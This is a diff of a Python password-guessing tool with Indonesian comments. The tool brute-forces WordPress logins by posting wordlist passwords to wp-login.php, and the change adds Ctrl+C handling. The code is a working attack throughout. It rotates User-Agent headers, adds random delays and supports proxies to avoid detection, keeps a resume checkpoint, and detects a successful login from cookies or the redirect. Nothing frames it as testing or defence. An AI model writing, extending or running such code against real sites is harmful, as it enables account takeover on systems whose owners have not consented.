@@ -153,65 +153,73 @@ def bruteforce_wp(
     resume_file: Optional[Path],
     proxy: Optional[str]
 ) -> Optional[str]:
-    """Brute-force WordPress login sequentially, with resume checkpoint & progress."""
+    """Brute-force WordPress login sequentially, with resume checkpoint, progress & Ctrl+C handling."""
     login_url = f"{target_url.rstrip('/')}/wp-login.php"
     session = requests.Session()
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
     total = len(passwords)
 
-    # Resume support (with reset if out of bounds)
+    # Resume support (reset jika out of bounds)
     start_idx = 0
     if resume_file and resume_file.exists():
         val = int(resume_file.read_text().strip() or "0")
         if val >= total:
-            # checkpoint sudah melebihi jumlah passwords: reset
             resume_file.unlink()
             logging.info("Resume-file melebihi wordlist, reset ke 0")
         else:
             start_idx = val
             logging.info("Melanjutkan dari password ke-%d", start_idx)
 
-    for idx in range(start_idx, total):
-        pwd = passwords[idx]
-        # progress
-        print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} Mencoba password: {pwd}", end="", flush=True)
+    try:
+        for idx in range(start_idx, total):
+            pwd = passwords[idx]
+            # tampilkan progress di satu baris
+            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} Mencoba password: {pwd}", end="", flush=True)
 
-        time.sleep(random.uniform(delay_range[0], delay_range[1]))
+            time.sleep(random.uniform(delay_range[0], delay_range[1]))
 
-        data = {
-            "log": username,
-            "pwd": pwd,
-            "wp-submit": "Log In",
-            "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
-            "testcookie": "1",
-        }
-        headers = {"User-Agent": random.choice(USER_AGENTS)}
+            data = {
+                "log": username,
+                "pwd": pwd,
+                "wp-submit": "Log In",
+                "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
+                "testcookie": "1",
+            }
+            headers = {"User-Agent": random.choice(USER_AGENTS)}
 
-        try:
-            resp = session.post(
-                login_url,
-                data=data,
-                timeout=timeout,
-                allow_redirects=True,
-                headers=headers,
-                proxies=proxies,
-            )
-        except requests.RequestException as e:
-            logging.warning(" Request gagal: %s", e)
-            continue
+            try:
+                resp = session.post(
+                    login_url,
+                    data=data,
+                    timeout=timeout,
+                    allow_redirects=True,
+                    headers=headers,
+                    proxies=proxies,
+                )
+            except requests.RequestException as e:
+                logging.warning(" Request gagal: %s", e)
+                continue
 
-        cookies = session.cookies.get_dict()
-        if "wordpress_logged_in" in cookies or "/wp-admin/" in resp.url:
-            print()  # newline setelah progress
-            logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
-            if resume_file and resume_file.exists():
-                resume_file.unlink()
-            return pwd
+            cookies = session.cookies.get_dict()
+            if "wordpress_logged_in" in cookies or "/wp-admin/" in resp.url:
+                print()  # newline setelah progress
+                logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
+                if resume_file and resume_file.exists():
+                    resume_file.unlink()
+                return pwd
 
-        # simpan checkpoint
-        if resume_file:
-            resume_file.write_text(str(idx + 1))
+            # simpan checkpoint
+            if resume_file:
+                resume_file.write_text(str(idx + 1))
+
+    except KeyboardInterrupt:
+        # Ctrl+C: cleanup resume-file dan exit
+        print()  # newline agar shell rapi
+        if resume_file and resume_file.exists():
+            resume_file.unlink()
+        logging.warning("🚫 Scan dihentikan oleh user. Resume file dihapus.")
+        sys.exit(1)
 
     # selesai tanpa hasil: hapus checkpoint agar run berikutnya mulai dari 0
     print()
